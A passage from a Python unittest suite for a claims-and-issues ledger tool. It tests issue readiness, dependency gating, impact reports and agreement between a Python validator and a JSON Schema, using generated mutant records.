            self.assertIsNotNone(tm.issue_event_error(st, ev), f"{st}->{ev}")

class TestNativeReady(unittest.TestCase):
    def _issues(self, *evs):
        return tm.fold_issues(events(*evs))

    def test_open_no_deps_is_ready(self):
        ready = tm.native_ready_issues(self._issues(issue_rec()))
        self.assertEqual(ready, [{"id": "wk-00000001", "title": "do the thing"}])

    def test_claimed_not_ready(self):
        issues = self._issues(issue_rec(), issue_ev("claimed",
                              ts="2026-07-01T00:00:01+00:00"))
        self.assertEqual(tm.native_ready_issues(issues), [])

    def test_dep_gates_until_closed(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        blocked = self._issues(dep, top)
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(blocked)])
        unblocked = self._issues(dep, top,
                                 issue_ev("closed", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertIn("wk-000000bb",
                      [i["id"] for i in tm.native_ready_issues(unblocked)])

    def test_cancelled_or_unknown_dep_blocks_forever(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        cancelled = self._issues(dep, top,
                                 issue_ev("cancelled", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(cancelled)])
        ghost = self._issues(issue_rec(rid="wk-000000bb", deps=["wk-00ghost0"]))
        self.assertEqual(tm.native_ready_issues(ghost), [])

class TestIssuePremiseMerge(unittest.TestCase):
    def test_premise_at_birth_collected_and_merged(self):
        issues = tm.fold_issues(events(issue_rec(premises=["tr-000000c1"])))
        born = tm.issue_premises(issues)
        self.assertEqual(born, {"wk-00000001": ["tr-000000c1"]})
        merged = tm.merge_premises({"wk-00000001": ["tr-000000c2"],
                                    "bd-x1": ["tr-000000c3"]}, born)
        self.assertEqual(merged["wk-00000001"], ["tr-000000c2", "tr-000000c1"])
        self.assertEqual(merged["bd-x1"], ["tr-000000c3"])

    def test_merge_deduplicates(self):
        merged = tm.merge_premises({"w": ["tr-000000c1"]},
                                   {"w": ["tr-000000c1"]})
        self.assertEqual(merged["w"], ["tr-000000c1"])

# ------------------------------------------------- impact query (ADR-005)

class TestImpact(unittest.TestCase):
    def _world(self):
        evs = events(
            rec("claim", verified_p(evidence_paths=["src/**"]),
                rid="tr-000000a1"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
                ts="2026-07-01T01:00:00+00:00"),
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            rec("premise", {"issue": "bd-x1", "claim": "tr-000000a1"},
                rid="tr-000000a3"),
            rec("claim", claim_p(text="retired fact",
                                 evidence_paths=["src/**"]),
                rid="tr-000000c9"),
            rec("verdict", {"claim": "tr-000000c9", "verdict": "retracted",
                            "basis": "dead"}, rid="tr-000000ca",
                ts="2026-07-01T01:00:00+00:00"))
        claims, premises = tm.fold(evs)
        issues = tm.fold_issues(evs)
        premises = tm.merge_premises(premises, tm.issue_premises(issues))
        return claims, issues, premises

    def test_watched_path_reported_with_holds(self):
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/deep/x.py"], claims, issues, premises)
        self.assertEqual([r["claim"] for r in rows], ["tr-000000a1"])
        self.assertEqual(rows[0]["holds"], ["bd-x1", "wk-000000b1"])
        self.assertEqual(rows[0]["touched"], ["src/deep/x.py"])

    def test_unwatched_path_is_silent(self):
        claims, issues, premises = self._world()
        self.assertEqual(
            tm.impact_report(["docs/readme.md"], claims, issues, premises),
            [])

    def test_dead_claims_never_whisper(self):
        """The retracted claim also watches src/** but must not appear:
        impact predicts stalings, and dead claims cannot stale."""
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertNotIn("tr-000000c9", [r["claim"] for r in rows])

    def test_closed_wk_hold_dropped_external_kept(self):
        claims, issues, premises = self._world()
        evs = events(
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            issue_ev("closed", ref="wk-000000b1", basis="done",
                     ts="2026-07-01T02:00:00+00:00"))
        issues = tm.fold_issues(evs)
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertEqual(rows[0]["holds"], ["bd-x1"])

# ------------------------------------------ schema conformance (shared corpus)

# Each fixture: (name, record, expected_valid). This corpus is the single
# source of truth for BOTH contract representations.
CORPUS = [
    ("unverified claim minimal", rec("claim", claim_p()), True),
    ("verified claim full", rec("claim", verified_p()), True),
    ("verified via ttl only", rec("claim", verified_p(evidence_paths=[],
                                                      ttl_days=7)), True),
    ("verified missing evidence",
     rec("claim", claim_p(evidence_class="VERIFIED")), False),
    ("inferred with basis",
     rec("claim", claim_p(evidence_class="INFERRED", basis="convention")), True),
    ("inferred missing basis",
     rec("claim", claim_p(evidence_class="INFERRED")), False),
    # v0.5.5: the mirror had drifted from the schema on exactly these two --
    # a record with no text passed validate while the schema rejected it.
    ("claim empty text", rec("claim", claim_p(text="")), False),
    ("claim missing text",
     rec("claim", {k: v for k, v in claim_p().items() if k != "text"}), False),
    ("bad tier", rec("claim", claim_p(cost_tier="P9")), False),
    ("bad class", rec("claim", claim_p(evidence_class="GUESSED")), False),
    ("bad envelope id", rec("claim", claim_p(), rid="claim-1"), False),
    ("verdict ok", rec("verdict", {"claim": "tr-00000001",
                                   "verdict": "agree", "basis": "b"}), True),
    ("verdict retracted ok", rec("verdict", {"claim": "tr-00000001",
                                             "verdict": "retracted",
                                             "basis": "b"}), True),
    ("verdict bad value", rec("verdict", {"claim": "tr-00000001",
                                          "verdict": "maybe", "basis": "b"}), False),
    ("verdict bad claim ref", rec("verdict", {"claim": "nope",
                                              "verdict": "agree", "basis": "b"}), False),
    ("verdict missing basis", rec("verdict", {"claim": "tr-00000001",
                                              "verdict": "agree"}), False),
    ("invalidation ok", rec("invalidation", {"claim": "tr-00000001",
                                             "commit": "abc1234",
                                             "reason": "ttl expired"}), True),
    ("invalidation missing commit",
     rec("invalidation", {"claim": "tr-00000001"}), False),
    ("premise ok", rec("premise", {"issue": "bd-x1",
                                   "claim": "tr-00000001"}), True),
    ("premise missing issue", rec("premise", {"claim": "tr-00000001"}), False),
    ("unknown kind", rec("wish", {"claim": "tr-00000001"}), False),
    # ---- work kernel (ADR-002, v0.5) ----
    ("issue ok", issue_rec(deps=["wk-00000002"],
                           premises=["tr-00000001"]), True),
    ("issue missing title", issue_rec(title=""), False),
    ("issue with tr envelope id", issue_rec(rid="tr-00000001"), False),
    ("issue bad dep ref", issue_rec(deps=["bd-x1"]), False),
    ("issue bad premise ref", issue_rec(premises=["nope"]), False),
    ("issue_event claimed ok", issue_ev("claimed"), True),
    ("issue_event closed with basis", issue_ev("closed", basis="done"), True),
    ("issue_event closed missing basis",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed"}), False),
    ("issue_event bad event", issue_ev("paused"), False),
    ("issue_event bad ref", issue_ev("claimed", ref="bd-x1"), False),
    ("issue_event with wk envelope id",
     issue_ev("claimed", rid="wk-00000009"), False),
    # ---- solo-regime hardening (v0.6) ----
    ("claim with scope_basis",
     rec("claim", claim_p(scope_basis="quantifier scoped to services/")), True),
    ("claim empty scope_basis",
     rec("claim", claim_p(scope_basis="")), False),
    ("claim with overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=["tr-00000001",
                                                 "tr-00000002"])), True),
    ("claim empty overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=[])), False),
    ("claim overridden_duplicates bad ref",
     rec("claim", claim_p(overridden_duplicates=["nope"])), False),
    ("verified evidence screened false",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": False})), True),
    ("verified evidence screened non-boolean",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": "yes"})), False),
    ("verdict mechanical subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "mechanical"}), True),
    ("verdict bad subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "cosmic"}), False),
    ("claim negative ttl", rec("claim", claim_p(ttl_days=-1)), False),
    ("empty envelope actor", rec("claim", claim_p()) | {"actor": ""}, False),
]

class TestConformancePython(unittest.TestCase):
    def test_corpus_against_validate_events(self):
        for name, record, expected in CORPUS:
            errors = tm.validate_events([(1, record)])
            self.assertEqual(not errors, expected,
                             f"{name}: validate_events said {errors or 'valid'}")

def _load_jsonschema():
    try:
        import jsonschema
        return jsonschema
    except ImportError:
        return None

JSONSCHEMA = _load_jsonschema()

class TestJsonschemaPresent(unittest.TestCase):
    """v0.4: the drift detector previously FAILED OPEN -- without the
    optional jsonschema package the suite went green with the durable
    contract unchecked. Now absence is a failure unless explicitly waived
    (TRUTH_ALLOW_NO_JSONSCHEMA=1), so 'cannot drift silently' is
    unconditional in CI."""
    def test_drift_detector_armed(self):
        if JSONSCHEMA is None and \
                os.environ.get("TRUTH_ALLOW_NO_JSONSCHEMA") != "1":
            self.fail("jsonschema not installed: the JSON Schema half of the "
                      "contract is UNCHECKED. pip install jsonschema, or waive "
                      "explicitly with TRUTH_ALLOW_NO_JSONSCHEMA=1.")

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; python mirror still tested")
class TestConformanceSchema(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.schema = json.load(f)
        cls.validator = JSONSCHEMA.Draft7Validator(cls.schema)

    def test_corpus_against_json_schema(self):
        for name, record, expected in CORPUS:
            errs = list(self.validator.iter_errors(record))
            self.assertEqual(not errs, expected,
                             f"{name}: JSON Schema said "
                             f"{[e.message for e in errs] or 'valid'}")

    def test_both_representations_agree_everywhere(self):
        for name, record, _ in CORPUS:
            py_ok = not tm.validate_events([(1, record)])
            js_ok = not list(self.validator.iter_errors(record))
            self.assertEqual(py_ok, js_ok,
                             f"CONTRACT DRIFT on '{name}': python={py_ok} schema={js_ok}")

# ---------------------- constraint-enumerated conformance corpus (FS-2)
#
# F1 and F8 were one defect class twice: two hand-maintained contract
# copies drifting, sampled by a hand-curated corpus. This generator
# derives mutants MECHANICALLY from every valid seed record -- delete
# each field, empty each string, junk each enum-ish value -- and asserts
# only AGREEMENT: whatever each validator says, they must say the same
# thing. A constraint added to the schema automatically grows mutants; a
# mirror that lags fails the suite the same day, not at the next audit.

def _clone(r):
    return json.loads(json.dumps(r))

def fs2_mutants(record):
    """Yield (name, mutant) pairs enumerating the constraint surface:
    envelope fields, one level of payload, one level of payload dicts."""
    out = []
    for k in list(record):
        m = _clone(record); del m[k]; out.append((f"del {k}", m))
        if isinstance(record[k], str):
            m = _clone(record); m[k] = ""; out.append((f"empty {k}", m))
            m = _clone(record); m[k] = "__XXX__"; out.append((f"junk {k}", m))
    p = record.get("payload")
    if not isinstance(p, dict):
        return out
    for k in list(p):
        m = _clone(record); del m["payload"][k]
        out.append((f"del payload.{k}", m))
        v = p[k]
        if isinstance(v, str):
            for nv, tag in (("", "empty"), ("__XXX__", "junk")):
                m = _clone(record); m["payload"][k] = nv
                out.append((f"{tag} payload.{k}", m))
        elif isinstance(v, bool):
            m = _clone(record); m["payload"][k] = "__XXX__"
            out.append((f"junk payload.{k}", m))
        elif isinstance(v, int):
            m = _clone(record); m["payload"][k] = -1
            out.append((f"neg payload.{k}", m))
        elif isinstance(v, list):
            m = _clone(record); m["payload"][k] = ["__XXX__"]
            out.append((f"junklist payload.{k}", m))
        elif isinstance(v, dict):
            for kk in list(v):
                m = _clone(record); del m["payload"][k][kk]
                out.append((f"del payload.{k}.{kk}", m))
                if isinstance(v[kk], str):
                    m = _clone(record); m["payload"][k][kk] = ""
                    out.append((f"empty payload.{k}.{kk}", m))
    return out

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; armed-detector test governs")
class TestGeneratedMutantsAgree(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.validator = JSONSCHEMA.Draft7Validator(json.load(f))

    def test_every_mutant_of_every_valid_seed_agrees(self):
        total = 0
        for seed_name, seed, valid in CORPUS:
            if not valid:
                continue
            for mut_name, mutant in fs2_mutants(seed):
                total += 1
                py_ok = not tm.validate_events([(1, mutant)])
                js_ok = not list(self.validator.iter_errors(mutant))
                self.assertEqual(
                    py_ok, js_ok,
                    f"CONTRACT DRIFT on generated mutant '{seed_name} / "
                    f"{mut_name}': python={py_ok} schema={js_ok}")
        # meta-canary: the generator is detection machinery and must not
        # fail open by generating nothing (the F1 lesson, applied to
        # F1's own fix)
        self.assertGreater(total, 200,
                           f"mutant generator produced only {total} cases")

if __name__ == "__main__":
    unittest.main(verbosity=1)
